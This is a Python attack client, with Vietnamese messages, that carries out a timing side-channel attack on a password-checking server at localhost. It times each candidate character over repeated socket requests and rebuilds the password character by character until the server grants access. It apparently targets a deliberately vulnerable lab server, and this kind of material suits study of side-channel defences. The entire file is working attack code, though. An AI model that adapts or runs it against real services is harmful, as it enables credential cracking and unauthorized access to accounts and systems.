import socket
import time
import string

POSSIBLE_CHARACTERS = string.ascii_lowercase + string.digits
NUM_SAMPLES_PER_CHAR = 10 
EXPECTED_SERVER_PER_CHAR_DELAY = 0.05

def measure_time(sock, attempt_password):
    total_time = 0
    for _ in range(NUM_SAMPLES_PER_CHAR):
        start_time = time.perf_counter()
        try:
            sock.sendall(attempt_password.encode())
            sock.recv(1024)
        except (ConnectionResetError, BrokenPipeError) as e:
            print(f"\n[!] Lỗi kết nối khi đo thời gian: {e}. Server có thể đã đóng.")
            return -1
        end_time = time.perf_counter()
        total_time += (end_time - start_time)
    return total_time / NUM_SAMPLES_PER_CHAR

def main():
    host = '127.0.0.1'
    port = 12345

    print("[*] Client tấn công Timing Attack đang khởi động...")
    print(f"[*] Sẽ lấy {NUM_SAMPLES_PER_CHAR} mẫu cho mỗi ký tự.")

    cracked_password = ""
    max_password_length = 30 # Giới hạn độ dài mật khẩu tối đa

    try:
        for i in range(max_password_length):
            timings = {}

            print(f"\n[*] Đang thử ký tự thứ {i+1}...")
            # In mật khẩu đã đoán được ban đầu cho vòng lặp ký tự này
            # (sẽ được cập nhật liên tục bên dưới bởi \r)
            print(f"    Mật khẩu đã đoán được: {cracked_password}", end="")


            for char_index, char_to_try in enumerate(POSSIBLE_CHARACTERS):
                progress = f"{char_index+1}/{len(POSSIBLE_CHARACTERS)}"
                print(f"\r    Mật khẩu đã đoán được: {cracked_password}{char_to_try} (Thử: {progress})", end="")

                attempt = cracked_password + char_to_try
                client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                try:
                    client_socket.connect((host, port))
                except socket.error as e:
                    print(f"\n[!] Không thể kết nối đến server: {e}")
                    print("[!] Hãy đảm bảo server đang chạy.")
                    return

                avg_time = measure_time(client_socket, attempt)
                client_socket.close()

                if avg_time == -1:
                    return

                timings[char_to_try] = avg_time

            if not timings:
                print("\n[!] Không nhận được thời gian nào từ server.")
                break

            sorted_timings = sorted(timings.items(), key=lambda item: item[1], reverse=True)
            best_char = sorted_timings[0][0]
            best_time = sorted_timings[0][1]

            # Xóa dòng tiến trình \r trước đó bằng cách in nhiều khoảng trắng và \r
            print(f"\r{' ' * 80}\r", end="")
            print(f"    --- Top 3 timings (cho vị trí {i+1}) ---")
            for char, t_avg in sorted_timings[:3]:
                print(f"    '{char}': {t_avg:.6f} s")
            print(f"    -------------------")

            if len(sorted_timings) > 1:
                second_best_time = sorted_timings[1][1]
                # Điều chỉnh ngưỡng cảnh báo dựa trên EXPECTED_SERVER_PER_CHAR_DELAY
                if (best_time - second_best_time) < (EXPECTED_SERVER_PER_CHAR_DELAY * 0.4):
                     print(f"    [!] Cảnh báo: Sự khác biệt thời gian giữa '{best_char}' ({best_time:.6f}s) và ký tự tốt thứ hai '{sorted_timings[1][0]}' ({second_best_time:.6f}s) là nhỏ.")

            cracked_password += best_char
            print(f"\n[+] Ký tự tiếp theo có khả năng là: '{best_char}' (Thời gian: {best_time:.6f} s)")
            print(f"[*] Mật khẩu hiện tại: {cracked_password}")

            client_socket_check = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                client_socket_check.connect((host, port))
                client_socket_check.sendall(cracked_password.encode())
                response = client_socket_check.recv(1024).decode()
                client_socket_check.close()

                if response == "ACCESS_GRANTED":
                    print(f"\n[SUCCESS] Mật khẩu đã được phá giải hoàn toàn: {cracked_password}")
                    break
            except socket.error as e:
                print(f"\n[!] Lỗi khi kiểm tra mật khẩu đã crack: {e}")
                return

            if i == max_password_length - 1 and response != "ACCESS_GRANTED":
                 print(f"\n[!] Không thể phá giải mật khẩu hoàn toàn sau {max_password_length} ký tự.")

    except KeyboardInterrupt:
        print("\n[-] Tấn công bị dừng bởi người dùng.")
    finally:
        print("[*] Client tấn công đã kết thúc.")

if __name__ == "__main__":
    main()